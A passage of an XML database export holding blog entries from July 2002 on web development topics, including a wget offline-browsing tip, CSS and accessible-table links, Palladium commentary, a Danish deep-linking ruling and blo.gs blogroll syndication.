		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">119</field>
		<field name="title">WGET tip</field>
		<field name="slug">wgetTip</field>
		<field name="body">&lt;p&gt;It looks like the Glastonbury write-up will have to wait until tomorrow, but in the mean time here's a handy tip (presented &lt;a href=&quot;http://lists.evolt.org/&quot; title=&quot;Evolt.org Mailing Lists&quot;&gt;evolt&lt;/a&gt; style):&lt;/p&gt;

&lt;p&gt;&amp;lt;tip type=&quot;Offline Browsing&quot;&amp;gt;&lt;/p&gt;

&lt;p&gt;If you ever want to grab a large chunk of a site for offline browsing in Windows, WGET is the ideal tool. First download &lt;a href=&quot;http://www.qtm.net/~twegscheid/wget.html&quot;&gt;WGET for Windows&lt;/a&gt;. Now drop &lt;code&gt;wget.exe&lt;/code&gt; in a directory on your System path (on Windows XP I used &lt;code&gt;C:\WINDOWS\system32&lt;/code&gt;). Fire up a command prompt (windows-key + R then &lt;code&gt;cmd&lt;/code&gt; and enter works for me) and type wget --help for a list of options. Most of the time the article / section of the site you want will all be contained in a subdirectory of the site, in which case you can use &lt;code&gt;wget -r -l0 --no-parent http://site.com/whatever/&lt;/code&gt; to grab everything in that subdirectory, without WGET following any links to parent directories.&lt;/p&gt;

&lt;p&gt;&amp;lt;/tip&amp;gt;&lt;/p&gt;</field>
		<field name="created">2002-07-02 23:40:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">120</field>
		<field name="title">Banging headache</field>
		<field name="slug">bangingHeadache</field>
		<field name="body">I haven't finished the Glastonbury writeup yet, mainly thanks to a banging headache and weird flu thing I may have picked up at the festival. Rather than promise it tomorrow I'll fall back on the good old cliché &quot;it'll be ready when it's finished&quot;.</field>
		<field name="created">2002-07-03 22:57:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">121</field>
		<field name="title">Message Catalog definition</field>
		<field name="slug">messageCatalog</field>
		<field name="body">&lt;p&gt;Here's something I picked up on the &lt;a href=&quot;http://mail.asis.org/mailman/listinfo/sigia-l&quot;&gt;Sigia-l mailing list&lt;/a&gt; the other day, courtesy of &lt;a href=&quot;http://www.strategux.com/&quot; title=&quot;Strategux Consulting, Inc.&quot;&gt;Patrick Hunt&lt;/a&gt; (reproduced with permission):&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;[A Message Catalog is...] A database of inline error, exception, informational and instructional
messages that can be dynamically called to a page-level message component
based on user ID, role, system/object state or some other parameter. Allows
messages to be re-used as appropriate and dynamically generated rather than
hard-coded. In addition to typical error messaging, such a system can be
tied to personalization, upsell/cross-sell, etc. The IA would conceivably be
involved, at a minimum, in determining message types and identifying pages
that require messages.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-03 23:23:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">122</field>
		<field name="title">Digital Web magazine</field>
		<field name="slug">digitalWebMagazine</field>
		<field name="body">&lt;p&gt;The latest issue of &lt;a href=&quot;http://www.digital-web.com/&quot;&gt;Digital Web Magazine&lt;/a&gt; is out, and it includes an excellent case study on redesigning a table based layout to use &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;: &lt;a href=&quot;http://www.digital-web.com/tutorials/tutorial_2002-06.shtml&quot;&gt;Web Page Reconstruction with CSS&lt;/a&gt;. They also have a &lt;a href=&quot;http://www.digital-web.com/reviews/book/bookreview_2002-06.shtml&quot;&gt;review of Eric Meyer's new CSS book&lt;/a&gt;, mentioned yesterday. Digital Web are currently looking for volunteers to help with the magazine's upcoming redesign - further information and a contact form &lt;a href=&quot;http://www.digital-web.com/contact_redesign.shtml&quot; title=&quot;Digital Web Magazine - Contact: Redesign Volunteer&quot;&gt;can be found here&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-03 23:28:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">123</field>
		<field name="title">Lego stuff</field>
		<field name="slug">legoStuff</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.lipsons.pwp.blueyonder.co.uk/mathlego.htm&quot;&gt;Mathematical Lego Sculptures&lt;/a&gt; (via &lt;a href=&quot;http://slashdot.org/articles/02/07/02/1346202.shtml&quot; title=&quot;Slashdot: Mathematical Lego Sculptures&quot;&gt;Slashdot&lt;/a&gt;). These are really cool - all kinds of bizzare mathematical shapes are on display, including some that are technically impossible (such as the Klein Bottle). The Slashdot discussion lead me to several other impressive lego sites, including a &lt;a href=&quot;http://www.henrylim.org/Stegosaurus.html&quot;&gt;huge lego stegosaurus&lt;/a&gt; and a &lt;a href=&quot;http://www.ericharshbarger.org/lego/clock.html&quot;&gt;working full size grandfather clock&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-03 23:34:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">124</field>
		<field name="title">XML request object</field>
		<field name="slug">xmlRequestObject</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://jibbering.com/2002/4/httprequest.html&quot;&gt;Using the XML HTTP Request object&lt;/a&gt; (via &lt;a href=&quot;http://www.techno-weenie.com/2002/07/02.html#a1268&quot;&gt;techno weenie&lt;/a&gt;) is an excellent tutorial covering remote &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; loading capabilities in both &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; and Mozilla, along with instructions on how to make &lt;acronym title=&quot;Simple Object Access Protocol&quot;&gt;SOAP&lt;/acronym&gt; requests using this technology.&lt;/p&gt;</field>
		<field name="created">2002-07-03 23:50:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">125</field>
		<field name="title">Alternative validator icons</field>
		<field name="slug">alternativeValidatorIcons</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.yayhooray.com/s-forums.cfm?action=read&amp;amp;id=56241&quot;&gt;Redesigned W3C validator icons&lt;/a&gt; (via &lt;a href=&quot;http://www.zeldman.com/daily/0602b.html#weekoff&quot;&gt;Zeldman&lt;/a&gt;). I like these a lot - I've avoided using a validator icon on this site up to now because they're pretty ugly, but I'll add the alternative XHTML 1.0 icon now.&lt;/p&gt;</field>
		<field name="created">2002-07-03 23:57:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">126</field>
		<field name="title">New Mozilla rendering mode</field>
		<field name="slug">newMozillaRenderingMode</field>
		<field name="body">&lt;p&gt;Evolt: &lt;a href=&quot;http://www.evolt.org/article/New_DOCTYPE_sniffing_in_upcoming_Mozilla_releases/1/32271/index.html&quot;&gt;New DOCTYPE sniffing in upcoming Mozilla releases&lt;/a&gt;. If you weren't confused enough by Mozilla's &lt;a href=&quot;http://mozilla.org/docs/web-developer/quirks/doctypes.html&quot;&gt;standards and quirks modes&lt;/a&gt;, the next release of the browser will include a third rendering mode called &quot;almost standards&quot; mode. Thankfully the difference between this and full standards mode is minimal - the only change is a subtle alteration to the way imagfes are handled in tables. This prevents table based layouts from breaking in standards mode (behaviour which has been &lt;a href=&quot;http://developer.netscape.com/evangelism/docs/articles/img-table/&quot; title=&quot;Tables, Images, and Mysterious Gaps&quot;&gt;described by Eric Meyer&lt;/a&gt; on Netscape DevEdge). This topic &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=66339&quot; title=&quot;Yet another Netscape Table Irritation&quot;&gt;came up on SitePoint&lt;/a&gt; recently and will probably be well recieved by most web developers, once the initial confusion has been overcome.&lt;/p&gt;</field>
		<field name="created">2002-07-04 10:25:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">127</field>
		<field name="title">Google interview</field>
		<field name="slug">googleInterview</field>
		<field name="body">&lt;p&gt;Slashdot are carrying an &lt;a href=&quot;http://slashdot.org/article.pl?sid=02/07/03/1352239&quot;&gt;interview with Craig Silverstein&lt;/a&gt;, Google's director of technology. The interview is actually quite disapointing - the answers given are relatively short and little new information is given. Topics covered include Google's &lt;a href=&quot;http://www.google.com/programming-contest/&quot; title=&quot;Google Programming Contest &quot;&gt;programming contest&lt;/a&gt;, how they monitor their immense server farm and a few questions on Google corporate culture.&lt;/p&gt;</field>
		<field name="created">2002-07-04 10:43:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">128</field>
		<field name="title">Spam proof email</field>
		<field name="slug">spamProofEmail</field>
		<field name="body">&lt;p&gt;Today saw a useful thread on &lt;a href=&quot;http://www.webdesign-l.com/&quot;&gt;Webdesign-L&lt;/a&gt; about hiding email addresses from spambots. Some of the points raised:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Javascript encryption makes addresses inacessible to anyoen with javascript disabled, not just spambots.&lt;/li&gt;
&lt;li&gt;Form based solutions help avoid ever exposing your address to the open web.&lt;/li&gt;
&lt;li&gt;An english description (mail cs1spw at bath dot ac dot uk) is a good solution, but may eventually be parsed by spambots as well.&lt;/li&gt;
&lt;li&gt;If you go down the javascript encryption route, adding an english description in &amp;lt;noscript&amp;gt; tags can make your address more accessible.&lt;/li&gt;
&lt;li&gt;An image showing your email address is spambot proof, but does not solve the problem of how to hide addresses that can be clicked on.&lt;/li&gt;
&lt;li&gt;A lot of users with webmail do not benefit from mailto: addresses anyway, and would prefer a form.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I have restructured my &lt;a href=&quot;/~cs1spw/blog/contact/&quot;&gt;contact page&lt;/a&gt; to take these in to account.&lt;/p&gt;</field>
		<field name="created">2002-07-04 15:58:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">129</field>
		<field name="title">Accessible tables</field>
		<field name="slug">accessibleTables</field>
		<field name="body">&lt;p&gt;Mark has been educating us on the accessible way of marking up tables, with particular reference to calendar tables on blogs. My blog doesn't have a calendar (yet, I'm considering adding one) but Mark's articles have brought up some interesting things that I was previously unaware of. &lt;a href=&quot;http://diveintomark.org/archives/2002/07/03.html#day_18_giving_your_calendar_a_real_caption&quot;&gt;Giving your calendar a real caption&lt;/a&gt; explains the &lt;code&gt;&amp;lt;caption&amp;gt;&lt;/code&gt; tag, which can provide a useful (and easily styled) caption for any table. &lt;a href=&quot;http://diveintomark.org/archives/2002/07/04.html#day_19_using_real_table_headers&quot;&gt;Using real table headers&lt;/a&gt; explains how &lt;code&gt;&amp;lt;th&amp;gt;&lt;/code&gt; tags are interpreted by speech browsers and shows how they can be used in conjunction with the &lt;code&gt;abbr&lt;/code&gt; attribute to create more accessible table columns.&lt;/p&gt;

&lt;p&gt;Mark also links to &lt;a href=&quot;http://www.mcu.org.uk/book/tables.html&quot; title=&quot;The MCU: Jim&amp;apos;s Web Accessibility Weblog : Table Manners&quot;&gt;Table Manners&lt;/a&gt;, a superb guide to creating accessible tables.&lt;/p&gt;</field>
		<field name="created">2002-07-04 18:24:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">130</field>
		<field name="title">Palladium</field>
		<field name="slug">palladium</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://boingboing.net/2002_07_01_archive.html#85221304&quot; title=&quot;What is Palladium?&quot;&gt;Boing Boing&lt;/a&gt;: &lt;a href=&quot;http://vitanuova.loyalty.org/2002-07-03.html&quot;&gt;Seth Schoen's notes on Palladium&lt;/a&gt; after a meeting with Microsoft. Cory Doctorow points out that &lt;q cite=&quot;http://boingboing.net/2002_07_01_archive.html#85221304&quot;&gt;Seth is probably the most knowledgeable tech person to have been briefed on Palladium by MSFT without signing an NDA&lt;/q&gt; and his post certainly makes interesting reading. Palladium has had a lot of coverage since the &lt;a href=&quot;http://www.msnbc.com/news/770511.asp?cp1=1&quot;&gt;Newsweek article&lt;/a&gt; announcing it first broke, with Robert Cringely providing &lt;a href=&quot;http://www.pbs.org/cringely/pulpit/pulpit20020627.html&quot; title=&quot;I Told You So&quot;&gt;some of the best analysis&lt;/a&gt; (in my opinion at least). The Register also has a &lt;a href=&quot;http://www.theregister.co.uk/content/4/26037.html&quot; title=&quot;Palladium tech up for discussion, says MS security chief&quot;&gt;story about Palladium&lt;/a&gt; which introduces some more information and guestimates on a shipping schedule.&lt;/p&gt;</field>
		<field name="created">2002-07-04 18:42:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">131</field>
		<field name="title">K-Logging</field>
		<field name="slug">kLogging</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.ashleyit.com/blogs/brentashley/archives/000388.html#000388&quot;&gt;Brent Ashley explains K-Logging&lt;/a&gt;. K-Logging is Knowledge Logging, a technique that companies can use to help share knowledge built up over the course of a project. Generally it involves the use of blogging style tools to informally record every part of a project. Brent also points to &lt;a href=&quot;http://dijest.editthispage.com/klogs/deadlykmsins&quot; title=&quot;Klogging vs. the 11 Deadly KM Sins&quot;&gt;this article&lt;/a&gt; explaining 11 common &lt;acronym title=&quot;Knowledge Management&quot;&gt;KM&lt;/acronym&gt; problems and how K-Logging helps overcome them.&lt;/p&gt;</field>
		<field name="created">2002-07-04 19:45:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">132</field>
		<field name="title">Blog update alerts</field>
		<field name="slug">blogUpdateAlerts</field>
		<field name="body">&lt;p&gt;I need a good, reliable way of automatically checking when various weblogs have been updated. I've tried aggregators (both &lt;a href=&quot;http://radio.userland.com/&quot;&gt;Radio Userland&lt;/a&gt; and &lt;a href=&quot;http://www.disobey.com/amphetadesk/&quot;&gt;Amphetadesk&lt;/a&gt;) and they don't do it for me - I don't want to read everyone's blog entries on one page, I just want to know when I should visit their site for updates. &lt;a href=&quot;http://www.weblogs.com/&quot;&gt;Weblogs.com&lt;/a&gt; appears to act as a centralised resource for recording updates, but requires blogs to &quot;ping&quot; it when they are altered - but what if the blog I am interested in doesn't do this? Mine doesn't (for the moment at least).&lt;/p&gt;

&lt;p&gt;The one constant feature of blogs I visit is an RSS feed, so it looks like I need a tool which can monitor a set of &lt;acronym title=&quot;Rich Site Summary&quot;&gt;RSS&lt;/acronym&gt; feeds (daily, hourly or whatever) and watch for updates. Does such a thing exist? I would prefer a tool that runs locally to an external service, in fact I'm very tempted to write one myself.&lt;/p&gt;</field>
		<field name="created">2002-07-04 19:57:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">133</field>
		<field name="title">Useful CSS links</field>
		<field name="slug">usefulCssLinks</field>
		<field name="body">&lt;p&gt;A few useful links spotted on &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;css-discuss&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://and.doxdesk.com/software/js/fixed.html&quot;&gt;A javascript fix&lt;/a&gt; to make IE support the &lt;code&gt;position:fixed&lt;/code&gt; &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; property. This is really clever, if a tiny bit jerky. the author has also created &lt;a href=&quot;http://and.doxdesk.com/software/&quot;&gt;several other javascript modules&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Three explanations of different implementations of margins and padding in unordered lists: &lt;a href=&quot;http://www.subotnik.net/style/list-box-test.html&quot;&gt;List box implementations in different browsers&lt;/a&gt;, &lt;a href=&quot;http://www.meyerweb.com/eric/css/list-indent.html&quot;&gt;Lists and Indentation&lt;/a&gt; and &lt;a href=&quot;http://home.deds.nl/~thebox/ghost/list.html&quot;&gt;Manipulating Margin And Padding Of Lists With CSS&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2002-07-04 21:18:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">134</field>
		<field name="title">Home improvements</field>
		<field name="slug">homeImprovements</field>
		<field name="body">&lt;p&gt;A couple of home improvements. I've added a &quot;5 latest comments&quot; box to the front page, and I've implemented a system to ping &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt; whenever this blog is updated. Next up, &lt;a href=&quot;http://www.weblogs.com/&quot;&gt;Weblogs.com&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-04 23:55:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">135</field>
		<field name="title">Blog tracking solution</field>
		<field name="slug">blogTrackingSolution</field>
		<field name="body">&lt;p&gt;I've found a solution to my &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/07/04/#blogUpdateAlerts&quot;&gt;blog tracking problems&lt;/a&gt;. &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt; is an excellent service which tracks when weblogs are updated by waiting for pings - either directly from the blog or indirectly by co-operating with &lt;a href=&quot;http://www.weblogs.com/&quot;&gt;Weblogs.com&lt;/a&gt; (and several other services). blo.gs users can then create a list of blogs they are interested in and have the site email them whenever one of their favourites is updated. If you don't want even more email (I certainly don't) the site can be set up to only display your favourite blogs in last-updated order when you visit it, or you can opt for a very handy Mozilla toolbar.&lt;/p&gt;</field>
		<field name="created">2002-07-05 10:58:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">136</field>
		<field name="title">Funky popups</field>
		<field name="slug">funkyPopups</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.scriptasylum.com/misc/popup/popup.html&quot; title=&quot;Window Popup Version 4.0 &quot;&gt;Funky javascript popup windows&lt;/a&gt; (via &lt;a href=&quot;http://www.wdf.net/&quot;&gt;wdf-list&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-07-05 11:31:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">137</field>
		<field name="title">More Python advocacy</field>
		<field name="slug">morePythonAdvocacy</field>
		<field name="body">&lt;p&gt;More Python advocacy: &lt;a href=&quot;http://www.linux-mag.com/2002-04/python_01.html&quot;&gt;PYTHON: Yes, You SHOULD Be Using it!&lt;/a&gt; The article contains some background information on Python and why it is worth knowing, but the bulk of the article consists of a getting started guide for Python on Linux, complete instructions on using the interactive prompt, code samples and a small CGI script. It is worth noting that the CGI script example should not be deployed anywhere accessible to the public as it could allow crackers to execute code of their chosing on your web server.&lt;/p&gt;</field>
		<field name="created">2002-07-05 13:31:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">138</field>
		<field name="title">Rasmus Lerdorf's blog</field>
		<field name="slug">rasmusLerdorfsBlog</field>
		<field name="body">&lt;p&gt;Rasmus Lerdorf (the creator of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;) has a &lt;a href=&quot;http://www.oreillynet.com/weblogs/author/85&quot; title=&quot;Weblogs by Rasmus Lerdorf&quot;&gt;blog&lt;/a&gt;. His &lt;a href=&quot;http://www.oreillynet.com/pub/wlg/1642&quot; title=&quot;TCPA Opportunity?&quot;&gt;latest entry discusses Palladium&lt;/a&gt;, and asks if it will actually help build up the alternative market of non wintel users.&lt;/p&gt;</field>
		<field name="created">2002-07-05 13:45:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">139</field>
		<field name="title">Hixie BSc</field>
		<field name="slug">hixieBSc</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://ln.hixie.ch/?start=1025875020&amp;amp;count=1&quot;&gt;Hixie BSc (Hons) passed his degree&lt;/a&gt;. Congrats :)&lt;/p&gt;</field>
		<field name="created">2002-07-05 15:17:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">140</field>
		<field name="title">Opera and Macromedia</field>
		<field name="slug">operaAndMacromedia</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.opera.com/pressreleases/en/2002/07/20020702.html&quot;&gt;Macromedia to Embed the Opera Browser in Web Authoring Products&lt;/a&gt; - it seems Opera could soon be providing the rendering engine for Dreamweaver's preview mode, at least on the Mac. Great news for &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; layout enthusiasts as from what I've heard Dreamweaver MX still does a lousy job of previewing &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; positioning in the editor.&lt;/p&gt;</field>
		<field name="created">2002-07-05 15:29:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">141</field>
		<field name="title">Stupid Danish newspapers</field>
		<field name="slug">stupidDanishNewspapers</field>
		<field name="body">&lt;p&gt;More deep linking stupidity (via &lt;a href=&quot;http://scriptingnews.userland.com/backissues/2002/07/05#When:9:03:22AM&quot;&gt;Scripting News&lt;/a&gt;). A judge in Denmark has &lt;a href=&quot;http://www.newsbooster.com/?pg=lost&amp;amp;lan=eng&quot;&gt;ruled in favour&lt;/a&gt; of a newspaper who took a search engine to court over &quot;deep linking&quot;, despite the search engine's spider following the &lt;code&gt;robots.txt&lt;/code&gt; standard (it seems the newspaper didn't bother to implement a &lt;code&gt;robots.txt&lt;/code&gt; file). Dave Winer summed things up perfectly:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.newsbooster.com/?pg=lost&amp;amp;lan=eng&quot;&gt;&lt;p&gt;BTW, deep linking is an oxymoron. There's only one kind of linking on the Web. Why would you ever point to the home page of a news oriented site.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-05 17:24:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">142</field>
		<field name="title">Final table tip</field>
		<field name="slug">finalTableTip</field>
		<field name="body">&lt;p&gt;A final table tip from Mark: &lt;a href=&quot;http://diveintomark.org/archives/2002/07/05.html#day_20_providing_a_summary_for_tables&quot;&gt;Providing a summary for tables&lt;/a&gt;. Mark explains the &lt;code&gt;summary&lt;/code&gt; attribute which should be attached to every &amp;lt;table&amp;gt; tag to summarise the purpose of the table. Tables used for layout should include an empty summary attribute to show they are layout tables (in a similar way to empty alt tags for layout images). The summary attribute is only used by text to speech browsers, so I'm slightly confused as to why it should be included for layout tables - surely if the attribute is empty a speech browser will skip tstraight over it as if it wasn't there?&lt;/p&gt;</field>
		<field name="created">2002-07-05 17:29:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">143</field>
		<field name="title">&amp;lt;strong&amp;gt; and &amp;lt;em&amp;gt;</field>
		<field name="slug">strongAndEm</field>
		<field name="body">&lt;p&gt;Caveat Lector: &lt;a href=&quot;http://www.textartisan.com/caveatlector/archive/2002_07.html#e000276&quot;&gt;&amp;lt;em&amp;gt;, &amp;lt;strong&amp;gt;, and markup assumptions&lt;/a&gt;. Dorothea Salo explains these semantic tags, why they exist and when they should be used, and throws in a bit of &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; history as well.&lt;/p&gt;</field>
		<field name="created">2002-07-05 17:42:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">144</field>
		<field name="title">Kevin Burton</field>
		<field name="slug">kevinBurton</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.peerfear.org/website/about.shtml&quot;&gt;Kevin Burton&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.peerfear.org/website/about.shtml&quot;&gt;&lt;p&gt;I personally believe that being intellectually open, to the point of promiscuity, not only helps further technology and society, but is an ethical issue as well. We have too many barriers to intellectual progress and these need to be eliminated.&lt;/p&gt;

&lt;p&gt;To that end, I have created this website as a public diary. I publish all my bookmarks and any relevant topics which I feel might benefit the public.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Kevin runs &lt;a href=&quot;http://www.peerfear.org/&quot;&gt;one heck of a blog&lt;/a&gt;, which true to the above quote covers a massive range of interests. I'm inspired :)&lt;/p&gt;</field>
		<field name="created">2002-07-05 19:05:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">145</field>
		<field name="title">More on deep linking</field>
		<field name="slug">moreOnDeepLinking</field>
		<field name="body">&lt;p&gt;It seems there's more to the &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/07/05/#stupidDanishNewspapers&quot;&gt;Danish deep linking&lt;/a&gt; story than first meets the eye. &lt;a href=&quot;http://slashdot.org/comments.pl?sid=35438&amp;amp;cid=3828172&quot; title=&quot;Clarification&quot;&gt;This comment on Slashdot&lt;/a&gt; clarifies some important details:&lt;/p&gt;

&lt;blockquote cite=&quot;http://slashdot.org/comments.pl?sid=35438&amp;amp;cid=3828172&quot;&gt;&lt;p&gt; 
[...] Second, the Danish Newspaper Publisher's Association weren't concerned about search engines like Google or just a few deep links. Newsbooster did a systematic index and furthermore sold services for update-information whenever your predefined search words matched any news article.&lt;/p&gt;

&lt;p&gt;Third, the case is very specific and isn't as much about technical details as it is of legal matter. It was concluded that Newsbooster was in violation of Danish law of marketing (&quot;good ethics&quot;, mainly concerning not gaining/harvesting of other companies products and services) and Danish law of intellectual property, since the articles at the Danish newspapers' sites were to be considered as a database, an index. Databases are also covered by the law of intellectual property [...] and since Newsbooster copied what would be considered as a database, the ruling was against Newsbooster. &lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-05 19:20:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">146</field>
		<field name="title">elgooG</field>
		<field name="slug">elgooG</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.alltooflat.com/geeky/elgoog/&quot;&gt;elgooG&lt;/a&gt; (via the &lt;a href=&quot;http://google.blogspace.com/archives/000395&quot;&gt;Google Weblog&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-07-05 20:19:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">147</field>
		<field name="title">Janis Ian</field>
		<field name="slug">janisIan</field>
		<field name="body">&lt;p&gt;Janis Ian: &lt;a href=&quot;http://www.janisian.com/article-internet_debacle.html&quot;&gt;The Internet Debacle - An Alternative View&lt;/a&gt; (via &lt;a href=&quot;http://scriptingnews.userland.com/backissues/2002/07/05#When:9:22:31AM&quot;&gt;Scripting News&lt;/a&gt;). This is an excellent, well researched piece on the problems facing the American music industry by an artist with &lt;a href=&quot;http://www.janisian.com/discography.html&quot;&gt;over 20 albums&lt;/a&gt; under her belt.&lt;/p&gt;&lt;p&gt;She heavily criticises the RIAA's appauling treatment of artists and backwards view of the internet, which could in fact help give thousands of artists free exposure which they would never recieve otherwise.&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.janisian.com/article-internet_debacle.html&quot;&gt;&lt;p&gt;As artists, we have the ear of the masses. We have the trust of the masses. By speaking out in our concerts and in the press, we can do a great deal to damp this hysteria, and put the blame for the sad state of our industry right back where it belongs - in the laps of record companies, radio programmers, and our own apparent inability to organize ourselves in order to better our own lives - and those of our fans&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-05 23:07:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">148</field>
		<field name="title">Better blogrolling</field>
		<field name="slug">betterBlogrolling</field>
		<field name="body">&lt;p&gt;Stuart at kryogenix.org &lt;a href=&quot;http://www.kryogenix.org/days/2002_07.cas#000124&quot;&gt;saw my post about blo.gs&lt;/a&gt; and re-implemented his blogroll to update from his &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt; subscriptions, complete with last updated times. It's such a brilliant idea that I've implemented it here as well. blo.gs allow you to syndicate your subscriptons in various formats, but by far the most useful is &lt;a href=&quot;http://blo.gs/296/favorites.xml&quot;&gt;favorites.xml&lt;/a&gt;, which orders them by last time updated and includes information on the time they last notified blo.gs of an update. It took less than 10 minutes to write a short PHP script to parse the XML and a few minutes more to set up a cron job to grab the XML file every hour. This is impressive stuff - thanks to blo.gs, XML and idea-sharing-via-blog myself and Stuart both have an automatically updated list of blogs right there on our sites.&lt;/p&gt;</field>
		<field name="created">2002-07-06 00:02:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">149</field>
		<field name="title">More on blo.gs</field>
		<field name="slug">moreOnBloGs</field>
		<field name="body">&lt;p&gt;More info on &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt; syndication. Phil Ringnalda has published a &lt;a href=&quot;http://philringnalda.com/phpblogroll/&quot;&gt;PHP script&lt;/a&gt; which can be used to syndicate a blogroll from blo.gs. For people without the capability to run server side scripts, blo.gs also syndicate blogrolls in a javascript file which uses &lt;code&gt;document.write&lt;/code&gt; commands to display a blogroll on a page.&lt;/p&gt;</field>
		<field name="created">2002-07-06 01:33:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">150</field>
		<field name="title">More blogroll fun</field>
		<field name="slug">moreBlogrollFun</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.kryogenix.org/&quot;&gt;Stuart&lt;/a&gt; has &lt;a href=&quot;http://www.kryogenix.org/days/2002_07.cas#000134&quot;&gt;added an extra innovation&lt;/a&gt; to his blogroll. Clicking on a link there now sets a cookie (via javascript) recording your visit - these are then used to display a 'new' icon if a blog has been updated since your last visit. The only downside is that the system can only track visits made through links on Stuart's site. Stuart says that easily automated stuff like this is why he recommends using a system like Moveable Type rather than rolling your own blog software. He's right, but I treat writing my own as an entertaining learning excercise - I get to play with &lt;acronym title=&quot;Rich Site Summary&quot;&gt;RSS&lt;/acronym&gt;, web services, &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parsing, the fun never stops ;)&lt;/p&gt;</field>
		<field name="created">2002-07-06 10:41:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">151</field>
		<field name="title">Interesting suggestion</field>
		<field name="slug">interestingSuggestion</field>
